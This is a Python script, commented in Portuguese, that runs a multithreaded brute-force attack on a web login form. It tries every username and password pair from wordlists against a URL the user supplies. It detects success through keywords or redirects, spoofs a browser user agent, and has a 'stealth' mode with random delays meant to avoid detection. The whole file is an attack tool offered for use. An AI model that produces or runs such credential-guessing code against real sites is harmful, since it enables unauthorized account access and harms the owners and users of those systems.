import requests
import threading
import time
import random
from queue import Queue

# Configurações
NUM_THREADS = 10
STEALTH = True
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
palavras_sucesso = ["Bem-vindo", "Painel", "Dashboard", "Logout"]  # Customize com base no alvo

# Fila de tarefas
fila = Queue()
sucesso = False
lock = threading.Lock()

def carregar_lista(caminho):
    try:
        with open(caminho, 'r') as arquivo:
            return arquivo.read().splitlines()
    except FileNotFoundError:
        print(f"[!] Arquivo não encontrado: {caminho}")
        exit(1)

def tentativa_login(url, usuario, senha):
    global sucesso
    headers = {
        "User-Agent": USER_AGENT
    }
    dados = {
        "username": usuario,
        "password": senha
    }

    try:
        resposta = requests.post(url, data=dados, headers=headers, timeout=5, allow_redirects=True)

        if resposta.status_code == 200:
            for palavra in palavras_sucesso:
                if palavra.lower() in resposta.text.lower():
                    with lock:
                        print(f"\n[✓] Sucesso: {usuario}:{senha}")
                        sucesso = True
                    return
            print(f"[-] {usuario}:{senha} (status 200, mas sem palavra-chave)")
        elif resposta.status_code in [301, 302]:
            with lock:
                print(f"\n[✓] Sucesso (redirect): {usuario}:{senha}")
                sucesso = True
        else:
            print(f"[-] {usuario}:{senha} (status {resposta.status_code})")
    except requests.RequestException as e:
        print(f"[!] Erro ao conectar: {e}")
    
    if STEALTH:
        time.sleep(random.uniform(0.5, 1.5))

def worker(url):
    while not fila.empty() and not sucesso:
        usuario, senha = fila.get()
        tentativa_login(url, usuario, senha)
        fila.task_done()

def executar_bruteforce(url, usuarios, senhas):
    print(f"[~] Iniciando força bruta em {url}")
    for u in usuarios:
        for s in senhas:
            fila.put((u, s))

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(url,))
        t.daemon = True
        t.start()
        threads.append(t)

    fila.join()

    if not sucesso:
        print("\n[-] Nenhuma combinação funcionou.")

def main():
    print("==== Força Bruta Web Avançada ====")
    alvo_url = input("URL do formulário de login: ").strip()
    usuarios = carregar_lista("usuarios.txt")
    senhas = carregar_lista("senhas.txt")

    executar_bruteforce(alvo_url, usuarios, senhas)
    print("\n[✓] Força bruta finalizada.")